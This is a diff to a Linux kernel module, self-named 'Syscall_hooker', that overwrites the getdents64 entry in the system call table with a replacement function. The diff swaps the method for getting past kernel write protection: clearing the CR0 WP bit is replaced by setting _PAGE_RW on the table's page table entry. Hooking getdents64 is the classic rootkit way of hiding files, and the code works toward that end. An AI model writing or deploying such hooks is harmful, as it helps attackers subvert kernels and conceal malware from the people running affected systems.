@@ -85,11 +85,18 @@ static int __init syscall_hooking_init(void)
 	}
 	sys_call_table = (void **)sym_addr;
 	orig_getdents64 = (asmlinkage long (*)(const struct pt_regs *))sys_call_table[__NR_getdents64];
-	unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
-	asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
+	unsigned int __attribute__((unused)) level;
+	pte_t *getdents64_pointer_pte;
+	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
+	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
+	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
+	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
 	sys_call_table[__NR_getdents64] = hacked_getdents64;
-	unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
-	asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
+	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
+	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
+	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
+	
+	
 	
 	printk(KERN_INFO "Syscall_hooker: Target acquired. Address: <REDACTED>\n");
 	
@@ -98,11 +105,16 @@ static int __init syscall_hooking_init(void)
 
 static void __exit syscall_hooking_exit(void)
 {
-	unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
-	asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
+	unsigned int __attribute__((unused)) level;
+	pte_t *getdents64_pointer_pte;
+	getdents64_pointer_pte = lookup_address((unsigned long)(&(sys_call_table[__NR_getdents64])), &level);
+	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte | _PAGE_RW;
+	// Deprecated: unsigned long no_wp_bit = read_cr0() & ~(1UL << 16);
+	// Depreacated: asm volatile("mov %0,%%cr0": "+r" (no_wp_bit) : : "memory");
 	sys_call_table[__NR_getdents64] = orig_getdents64;
-	unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
-	asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
+	getdents64_pointer_pte->pte = getdents64_pointer_pte->pte & ~(_PAGE_RW);
+	// Deprecated: unsigned long yes_wp_bit = read_cr0() | (1UL << 16);
+	// Deprecated: asm volatile("mov %0,%%cr0": "+r" (yes_wp_bit) : : "memory");
 	printk(KERN_INFO "Syscall_hooker: Mission complete!\n");
 }
 
